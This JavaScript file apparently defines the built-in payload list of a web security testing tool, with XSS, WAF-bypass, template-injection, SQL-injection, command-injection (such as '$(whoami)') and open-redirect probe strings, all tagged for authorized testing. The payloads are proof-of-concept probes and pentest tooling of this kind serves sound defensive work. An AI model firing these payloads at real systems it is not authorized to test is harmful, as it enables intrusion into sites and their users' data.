const BUILTIN_PAYLOADS = [
  {
    "id": "bx-001",
    "category": "Basic XSS",
    "name": "Basic XSS Test 01",
    "payload": "<script>alert(document.domain)</script>",
    "context": "HTML",
    "description": "Testing Basic XSS in HTML context. ",
    "risk": "High",
    "tags": [
      "basic-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "bx-002",
    "category": "Basic XSS",
    "name": "Basic XSS Test 02",
    "payload": "\"><svg/onload=alert(document.domain)>",
    "context": "Attribute",
    "description": "Testing Basic XSS  in Attribute context. ",
    "risk": "High",
    "tags": [
      "basic-xss",
      "attribute",
      "authorized-testing"
    ]
  },
  {
    "id": "bx-003",
    "category": "Basic XSS",
    "name": "Basic XSS Test 03",
    "payload": "'><img src=x onerror=alert(document.domain)>",
    "context": "Attribute",
    "description": "Testing Basic XSS  in Attribute context. ",
    "risk": "High",
    "tags": [
      "basic-xss",
      "attribute",
      "authorized-testing"
    ]
  },
  {
    "id": "bx-004",
    "category": "Basic XSS",
    "name": "Basic XSS Test 04",
    "payload": "<body onload=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing Basic XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "basic-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "bx-005",
    "category": "Basic XSS",
    "name": "Basic XSS Test 05",
    "payload": "<details open ontoggle=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing Basic XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "basic-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "bx-006",
    "category": "Basic XSS",
    "name": "Basic XSS Test 06",
    "payload": "<marquee onstart=alert(document.domain)>test</marquee>",
    "context": "HTML",
    "description": "Testing Basic XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "basic-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-001",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 01",
    "payload": "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-002",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 02",
    "payload": "<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-003",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 03",
    "payload": "<iframe srcdoc=\"<svg onload=alert(document.domain)>\"></iframe>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-004",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 04",
    "payload": "<input autofocus onfocus=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-005",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 05",
    "payload": "<video><source onerror=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-006",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 06",
    "payload": "<object data=\"javascript:alert(document.domain)\"></object>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-007",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 07",
    "payload": "<a href=\"javas&#99;ript:alert(document.domain)\">click</a>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ax-008",
    "category": "Advanced XSS",
    "name": "Advanced XSS Test 08",
    "payload": "<svg><set onbegin=alert(document.domain) attributeName=x to=y>",
    "context": "HTML",
    "description": "Testing Advanced XSS  in HTML context. ",
    "risk": "High",
    "tags": [
      "advanced-xss",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "dx-001",
    "category": "DOM XSS",
    "name": "DOM XSS Test 01",
    "payload": "#<img src=x onerror=alert(document.domain)>",
    "context": "URL",
    "description": "Testing DOM XSS  in URL context. ",
    "risk": "High",
    "tags": [
      "dom-xss",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "dx-002",
    "category": "DOM XSS",
    "name": "DOM XSS Test 02",
    "payload": "?q=<svg/onload=alert(document.domain)>",
    "context": "URL",
    "description": "Testing DOM XSS  in URL context. ",
    "risk": "High",
    "tags": [
      "dom-xss",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "dx-003",
    "category": "DOM XSS",
    "name": "DOM XSS Test 03",
    "payload": "javascript:alert(document.domain)",
    "context": "URL",
    "description": "Testing DOM XSS  in URL context. ",
    "risk": "High",
    "tags": [
      "dom-xss",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "dx-004",
    "category": "DOM XSS",
    "name": "DOM XSS Test 04",
    "payload": "{\"redirect\":\"javascript:alert(document.domain)\"}",
    "context": "JSON",
    "description": "Testing DOM XSS  in JSON context. ",
    "risk": "High",
    "tags": [
      "dom-xss",
      "json",
      "authorized-testing"
    ]
  },
  {
    "id": "dx-005",
    "category": "DOM XSS",
    "name": "DOM XSS Test 05",
    "payload": "{\"html\":\"<img src=x onerror=alert(document.domain)>\"}",
    "context": "JSON",
    "description": "Testing DOM XSS  in JSON context. ",
    "risk": "High",
    "tags": [
      "dom-xss",
      "json",
      "authorized-testing"
    ]
  },
  {
    "id": "dx-006",
    "category": "DOM XSS",
    "name": "DOM XSS Test 06",
    "payload": "window.name=<svg/onload=alert(document.domain)>",
    "context": "JavaScript",
    "description": "Testing DOM XSS  in JavaScript context. ",
    "risk": "High",
    "tags": [
      "dom-xss",
      "javascript",
      "authorized-testing"
    ]
  },
  {
    "id": "hi-001",
    "category": "HTML Injection",
    "name": "HTML Injection Test 01",
    "payload": "<h1>Security Test</h1>",
    "context": "HTML",
    "description": "Testing HTML Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "html-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "hi-002",
    "category": "HTML Injection",
    "name": "HTML Injection Test 02",
    "payload": "<b>Injected Bold Text</b>",
    "context": "HTML",
    "description": "Testing HTML Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "html-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "hi-003",
    "category": "HTML Injection",
    "name": "HTML Injection Test 03",
    "payload": "<style>body{outline:5px solid red}</style>",
    "context": "HTML",
    "description": "Testing HTML Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "html-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "hi-004",
    "category": "HTML Injection",
    "name": "HTML Injection Test 04",
    "payload": "<meta http-equiv=\"refresh\" content=\"5\">",
    "context": "HTML",
    "description": "Testing HTML Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "html-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "hi-005",
    "category": "HTML Injection",
    "name": "HTML Injection Test 05",
    "payload": "<form><input placeholder=\"Injected form field\"></form>",
    "context": "HTML",
    "description": "Testing HTML Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "html-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "hi-006",
    "category": "HTML Injection",
    "name": "HTML Injection Test 06",
    "payload": "<template><p>Template injection marker</p></template>",
    "context": "HTML",
    "description": "Testing HTML Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "html-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-001",
    "category": "Content Spoofing",
    "name": "Content Spoofing Test 01",
    "payload": "<div style=\"position:fixed;inset:0;background:white;z-index:9999\"><h1>Maintenance Notice</h1><p>Security test banner.</p></div>",
    "context": "HTML",
    "description": "Testing Content Spoofing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "content-spoofing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-002",
    "category": "Content Spoofing",
    "name": "Content Spoofing Test 02",
    "payload": "<p><strong>Account verification notice - test only</strong></p>",
    "context": "HTML",
    "description": "Testing Content Spoofing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "content-spoofing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-003",
    "category": "Content Spoofing",
    "name": "Content Spoofing Test 03",
    "payload": "<title>Security Test Title</title>",
    "context": "HTML",
    "description": "Testing Content Spoofing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "content-spoofing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-004",
    "category": "Content Spoofing",
    "name": "Content Spoofing Test 04",
    "payload": "<base href=\"https://example.com/\">",
    "context": "HTML",
    "description": "Testing Content Spoofing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "content-spoofing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-005",
    "category": "Content Spoofing",
    "name": "Content Spoofing Test 05",
    "payload": "<dialog open>Injected test dialog</dialog>",
    "context": "HTML",
    "description": "Testing Content Spoofing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "content-spoofing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-006",
    "category": "Content Spoofing",
    "name": "Content Spoofing Test 06",
    "payload": "<blockquote>Injected content-spoofing marker</blockquote>",
    "context": "HTML",
    "description": "Testing Content Spoofing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "content-spoofing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ii-001",
    "category": "iframe Injection",
    "name": "iframe Injection Test 01",
    "payload": "<iframe src=\"https://example.com\" title=\"test\"></iframe>",
    "context": "HTML",
    "description": "Testing iframe Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "iframe-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ii-002",
    "category": "iframe Injection",
    "name": "iframe Injection Test 02",
    "payload": "<iframe srcdoc=\"<h1>Injected iframe marker</h1>\"></iframe>",
    "context": "HTML",
    "description": "Testing iframe Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "iframe-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ii-003",
    "category": "iframe Injection",
    "name": "iframe Injection Test 03",
    "payload": "<iframe sandbox srcdoc=\"<svg onload=alert(document.domain)>\"></iframe>",
    "context": "HTML",
    "description": "Testing iframe Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "iframe-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ii-004",
    "category": "iframe Injection",
    "name": "iframe Injection Test 04",
    "payload": "<iframe src=\"about:blank\" name=\"PayloadBuddy-test\"></iframe>",
    "context": "HTML",
    "description": "Testing iframe Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "iframe-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ii-005",
    "category": "iframe Injection",
    "name": "iframe Injection Test 05",
    "payload": "<iframe src=\"data:text/html,<h1>Iframe Test</h1>\"></iframe>",
    "context": "HTML",
    "description": "Testing iframe Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "iframe-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ii-006",
    "category": "iframe Injection",
    "name": "iframe Injection Test 06",
    "payload": "<iframe loading=\"lazy\" src=\"https://example.org\"></iframe>",
    "context": "HTML",
    "description": "Testing iframe Injection  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "iframe-injection",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-001",
    "category": "Client-side",
    "name": "Client-side Test 01",
    "payload": "\" onmouseover=\"alert(document.domain)",
    "context": "Attribute",
    "description": "Testing Client-side  in Attribute context. ",
    "risk": "Medium",
    "tags": [
      "client-side",
      "attribute",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-002",
    "category": "Client-side",
    "name": "Client-side Test 02",
    "payload": "`);alert(document.domain);//",
    "context": "JavaScript",
    "description": "Testing Client-side  in JavaScript context. ",
    "risk": "Medium",
    "tags": [
      "client-side",
      "javascript",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-003",
    "category": "Client-side",
    "name": "Client-side Test 03",
    "payload": "</script><svg onload=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing Client-side  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "client-side",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-004",
    "category": "Client-side",
    "name": "Client-side Test 04",
    "payload": "${alert(document.domain)}",
    "context": "JavaScript",
    "description": "Testing Client-side  in JavaScript context. ",
    "risk": "Medium",
    "tags": [
      "client-side",
      "javascript",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-005",
    "category": "Client-side",
    "name": "Client-side Test 05",
    "payload": "{{constructor.constructor(\"alert(document.domain)\")()}}",
    "context": "JavaScript",
    "description": "Testing Client-side  in JavaScript context. ",
    "risk": "Medium",
    "tags": [
      "client-side",
      "javascript",
      "authorized-testing"
    ]
  },
  {
    "id": "cs-006",
    "category": "Client-side",
    "name": "Client-side Test 06",
    "payload": "<img src=x onerror=\"confirm(document.domain)\">",
    "context": "HTML",
    "description": "Testing Client-side  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "client-side",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "ss-001",
    "category": "Server-side",
    "name": "Server-side Test 01",
    "payload": "{{7*7}}",
    "context": "Server-side",
    "description": "Testing Server-side  in Server-side context. ",
    "risk": "Medium",
    "tags": [
      "server-side",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ss-002",
    "category": "Server-side",
    "name": "Server-side Test 02",
    "payload": "${7*7}",
    "context": "Server-side",
    "description": "Testing Server-side  in Server-side context. ",
    "risk": "Medium",
    "tags": [
      "server-side",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ss-003",
    "category": "Server-side",
    "name": "Server-side Test 03",
    "payload": "#{7*7}",
    "context": "Server-side",
    "description": "Testing Server-side  in Server-side context. ",
    "risk": "Medium",
    "tags": [
      "server-side",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ss-004",
    "category": "Server-side",
    "name": "Server-side Test 04",
    "payload": "<%= 7*7 %>",
    "context": "Server-side",
    "description": "Testing Server-side  in Server-side context. ",
    "risk": "Medium",
    "tags": [
      "server-side",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ss-005",
    "category": "Server-side",
    "name": "Server-side Test 05",
    "payload": "${{7*7}}",
    "context": "Server-side",
    "description": "Testing Server-side  in Server-side context. ",
    "risk": "Medium",
    "tags": [
      "server-side",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ss-006",
    "category": "Server-side",
    "name": "Server-side Test 06",
    "payload": "[[${7*7}]]",
    "context": "Server-side",
    "description": "Testing Server-side  in Server-side context. ",
    "risk": "Medium",
    "tags": [
      "server-side",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-001",
    "category": "SSTI",
    "name": "SSTI Test 01",
    "payload": "{{config}}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-002",
    "category": "SSTI",
    "name": "SSTI Test 02",
    "payload": "{{request}}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-003",
    "category": "SSTI",
    "name": "SSTI Test 03",
    "payload": "{{ self }}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-004",
    "category": "SSTI",
    "name": "SSTI Test 04",
    "payload": "${T(java.lang.Math).max(7,9)}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-005",
    "category": "SSTI",
    "name": "SSTI Test 05",
    "payload": "<#assign x=7*7>${x}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-006",
    "category": "SSTI",
    "name": "SSTI Test 06",
    "payload": "{{7*\"7\"}}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-007",
    "category": "SSTI",
    "name": "SSTI Test 07",
    "payload": "{% debug %}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "s-008",
    "category": "SSTI",
    "name": "SSTI Test 08",
    "payload": "{{ cycler }}",
    "context": "Server-side",
    "description": "Testing SSTI  in Server-side context. ",
    "risk": "High",
    "tags": [
      "ssti",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-001",
    "category": "SQL Injection",
    "name": "SQL Injection Test 01",
    "payload": "' OR '1'='1",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-002",
    "category": "SQL Injection",
    "name": "SQL Injection Test 02",
    "payload": "\" OR \"1\"=\"1",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-003",
    "category": "SQL Injection",
    "name": "SQL Injection Test 03",
    "payload": "' AND '1'='2",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-004",
    "category": "SQL Injection",
    "name": "SQL Injection Test 04",
    "payload": "' ORDER BY 1--",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-005",
    "category": "SQL Injection",
    "name": "SQL Injection Test 05",
    "payload": "' UNION SELECT NULL--",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-006",
    "category": "SQL Injection",
    "name": "SQL Injection Test 06",
    "payload": "admin'--",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-007",
    "category": "SQL Injection",
    "name": "SQL Injection Test 07",
    "payload": "') OR ('1'='1",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "si-008",
    "category": "SQL Injection",
    "name": "SQL Injection Test 08",
    "payload": "1 OR 1=1",
    "context": "Server-side",
    "description": "Testing SQL Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "sql-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ci-001",
    "category": "Command Injection",
    "name": "Command Injection Test 01",
    "payload": ";id",
    "context": "Server-side",
    "description": "Testing Command Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "command-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ci-002",
    "category": "Command Injection",
    "name": "Command Injection Test 02",
    "payload": "&& whoami",
    "context": "Server-side",
    "description": "Testing Command Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "command-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ci-003",
    "category": "Command Injection",
    "name": "Command Injection Test 03",
    "payload": "| whoami",
    "context": "Server-side",
    "description": "Testing Command Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "command-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ci-004",
    "category": "Command Injection",
    "name": "Command Injection Test 04",
    "payload": "`whoami`",
    "context": "Server-side",
    "description": "Testing Command Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "command-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ci-005",
    "category": "Command Injection",
    "name": "Command Injection Test 05",
    "payload": "$(whoami)",
    "context": "Server-side",
    "description": "Testing Command Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "command-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "ci-006",
    "category": "Command Injection",
    "name": "Command Injection Test 06",
    "payload": "; ping -c 1 127.0.0.1",
    "context": "Server-side",
    "description": "Testing Command Injection  in Server-side context. ",
    "risk": "High",
    "tags": [
      "command-injection",
      "server-side",
      "authorized-testing"
    ]
  },
  {
    "id": "x-001",
    "category": "XXE",
    "name": "XXE Test 01",
    "payload": "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe \"PayloadBuddy\">]><root>&xxe;</root>",
    "context": "XML",
    "description": "Testing XXE  in XML context. ",
    "risk": "High",
    "tags": [
      "xxe",
      "xml",
      "authorized-testing"
    ]
  },
  {
    "id": "x-002",
    "category": "XXE",
    "name": "XXE Test 02",
    "payload": "<?xml version=\"1.0\"?><root><![CDATA[PayloadBuddy XXE marker]]></root>",
    "context": "XML",
    "description": "Testing XXE  in XML context. ",
    "risk": "High",
    "tags": [
      "xxe",
      "xml",
      "authorized-testing"
    ]
  },
  {
    "id": "x-003",
    "category": "XXE",
    "name": "XXE Test 03",
    "payload": "<!DOCTYPE svg [<!ENTITY test \"PayloadBuddy\">]><svg>&test;</svg>",
    "context": "XML",
    "description": "Testing XXE  in XML context. ",
    "risk": "High",
    "tags": [
      "xxe",
      "xml",
      "authorized-testing"
    ]
  },
  {
    "id": "x-004",
    "category": "XXE",
    "name": "XXE Test 04",
    "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY>]><r>test</r>",
    "context": "XML",
    "description": "Testing XXE  in XML context. ",
    "risk": "High",
    "tags": [
      "xxe",
      "xml",
      "authorized-testing"
    ]
  },
  {
    "id": "x-005",
    "category": "XXE",
    "name": "XXE Test 05",
    "payload": "<?xml version=\"1.0\"?><root><item>XXE parser test</item></root>",
    "context": "XML",
    "description": "Testing XXE  in XML context. ",
    "risk": "High",
    "tags": [
      "xxe",
      "xml",
      "authorized-testing"
    ]
  },
  {
    "id": "x-006",
    "category": "XXE",
    "name": "XXE Test 06",
    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY harmless \"test\">]><foo>&harmless;</foo>",
    "context": "XML",
    "description": "Testing XXE  in XML context. ",
    "risk": "High",
    "tags": [
      "xxe",
      "xml",
      "authorized-testing"
    ]
  },
  {
    "id": "or-001",
    "category": "Open Redirect",
    "name": "Open Redirect Test 01",
    "payload": "//example.com",
    "context": "URL",
    "description": "Testing Open Redirect  in URL context. ",
    "risk": "Medium",
    "tags": [
      "open-redirect",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "or-002",
    "category": "Open Redirect",
    "name": "Open Redirect Test 02",
    "payload": "https://example.com",
    "context": "URL",
    "description": "Testing Open Redirect  in URL context. ",
    "risk": "Medium",
    "tags": [
      "open-redirect",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "or-003",
    "category": "Open Redirect",
    "name": "Open Redirect Test 03",
    "payload": "/\\example.com",
    "context": "URL",
    "description": "Testing Open Redirect  in URL context. ",
    "risk": "Medium",
    "tags": [
      "open-redirect",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "or-004",
    "category": "Open Redirect",
    "name": "Open Redirect Test 04",
    "payload": "///example.com",
    "context": "URL",
    "description": "Testing Open Redirect  in URL context. ",
    "risk": "Medium",
    "tags": [
      "open-redirect",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "or-005",
    "category": "Open Redirect",
    "name": "Open Redirect Test 05",
    "payload": "https://trusted.example.com.evil.test",
    "context": "URL",
    "description": "Testing Open Redirect  in URL context. ",
    "risk": "Medium",
    "tags": [
      "open-redirect",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "or-006",
    "category": "Open Redirect",
    "name": "Open Redirect Test 06",
    "payload": "%2f%2fexample.com",
    "context": "URL",
    "description": "Testing Open Redirect  in URL context. ",
    "risk": "Medium",
    "tags": [
      "open-redirect",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "wbt-001",
    "category": "WAF Bypass Testing",
    "name": "WAF Bypass Testing Test 01",
    "payload": "<ScRiPt>alert(document.domain)</sCrIpT>",
    "context": "HTML",
    "description": "Testing WAF Bypass Testing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "waf-bypass-testing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "wbt-002",
    "category": "WAF Bypass Testing",
    "name": "WAF Bypass Testing Test 02",
    "payload": "<svg%20onload=alert(document.domain)>",
    "context": "URL",
    "description": "Testing WAF Bypass Testing  in URL context. ",
    "risk": "Medium",
    "tags": [
      "waf-bypass-testing",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "wbt-003",
    "category": "WAF Bypass Testing",
    "name": "WAF Bypass Testing Test 03",
    "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E",
    "context": "URL",
    "description": "Testing WAF Bypass Testing  in URL context. ",
    "risk": "Medium",
    "tags": [
      "waf-bypass-testing",
      "url",
      "authorized-testing"
    ]
  },
  {
    "id": "wbt-004",
    "category": "WAF Bypass Testing",
    "name": "WAF Bypass Testing Test 04",
    "payload": "<img/src=x/onerror=alert(document.domain)>",
    "context": "HTML",
    "description": "Testing WAF Bypass Testing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "waf-bypass-testing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "wbt-005",
    "category": "WAF Bypass Testing",
    "name": "WAF Bypass Testing Test 05",
    "payload": "<svg onload=alert&#40;document.domain&#41;>",
    "context": "HTML",
    "description": "Testing WAF Bypass Testing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "waf-bypass-testing",
      "html",
      "authorized-testing"
    ]
  },
  {
    "id": "wbt-006",
    "category": "WAF Bypass Testing",
    "name": "WAF Bypass Testing Test 06",
    "payload": "<iframe srcdoc=&quot;&lt;svg onload=alert(document.domain)&gt;&quot;>",
    "context": "HTML",
    "description": "Testing WAF Bypass Testing  in HTML context. ",
    "risk": "Medium",
    "tags": [
      "waf-bypass-testing",
      "html",
      "authorized-testing"
    ]
  }
];
